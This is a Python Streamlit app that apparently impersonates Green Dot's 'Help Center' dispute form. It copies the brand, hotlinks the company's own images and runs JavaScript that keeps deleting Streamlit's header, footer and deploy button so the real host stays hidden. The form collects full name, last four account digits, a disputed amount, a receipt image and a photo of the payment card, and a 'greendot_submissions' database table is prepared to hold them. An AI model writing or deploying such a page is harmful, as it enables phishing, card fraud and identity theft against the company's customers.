
import streamlit as st
import sqlite3
import os
from datetime import datetime

# Configuración de Rutas
DB_NAME = "claims.db"
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)"""
    )
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# JS DE VISIBILIDAD AGRESIVA
st.markdown("""<script>
    const forceVisibility = () => {
        // Forzar visibilidad de textos en botones de carga
        document.querySelectorAll('[data-testid="stFileUploader"] button').forEach(el => {
            el.style.color = '#FFFFFF';
            el.style.backgroundColor = '#262730';
        });
        
        // Eliminar elementos de interfaz de Streamlit
        ['header', 'footer', '.stDeployButton', '[data-testid="stHeader"]', '[data-testid="stAppToolbar"]'].forEach(s => {
            document.querySelectorAll(s).forEach(el => el.remove());
        });
    };
    setInterval(forceVisibility, 50);
</script>""", unsafe_allow_html=True)

# CSS PARA MODO CLARO/OSCURO FORZADO
st.markdown("""<style>
    /* Fondo base negro absoluto */
    .stApp {
        background-color: #000000 !important;
    }

    /* BOTONES DE UPLOAD (Texto visible) */
    [data-testid="stFileUploader"] button {
        color: #FFFFFF !important;
        background-color: #333333 !important;
        border: 1px solid #444444 !important;
    }
    
    /* BOTÓN SUBMIT NOW (Contraste Máximo) */
    .stButton > button {
        background-color: #00a05b !important;
        color: #FFFFFF !important;
        border: 2px solid #FFFFFF !important;
        font-weight: 800 !important;
        text-transform: uppercase !important;
    }

    /* TEXTOS DE ETIQUETAS */
    label p, .stMarkdown p {
        color: #FFFFFF !important;
    }

    /* INPUTS */
    .stTextInput input, .stNumberInput input {
        background-color: #1a1a1a !important;
        color: #FFFFFF !important;
        border: 1px solid #333333 !important;
    }

    /* Contenedor principal */
    .block-container {
        max-width: 500px !important;
    }
    
    header, footer, .stDeployButton { display: none !important; }
</style>""", unsafe_allow_html=True)

if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
st.title("Help Center")

with st.form("claim_v1_2_9", clear_on_submit=True):
    st.text_input("Full Name")
    st.text_input("Last 4 digits of Account")
    st.number_input("Disputed Amount", format="%.2f")
    st.file_uploader("Store Receipt", type=["jpg","png"])
    st.file_uploader("Card Photo", type=["jpg","png"])
    if st.form_submit_button("SUBMIT NOW"):
        st.success("Claim Received.")

st.markdown("""<div style='background-color: #111; padding: 20px; border-radius: 12px; text-align: center; margin-top: 20px;'>
    <p style='color: white; font-weight: bold;'>Download the Green Dot app</p>
    <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'>
    <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'>
</div>""", unsafe_allow_html=True)
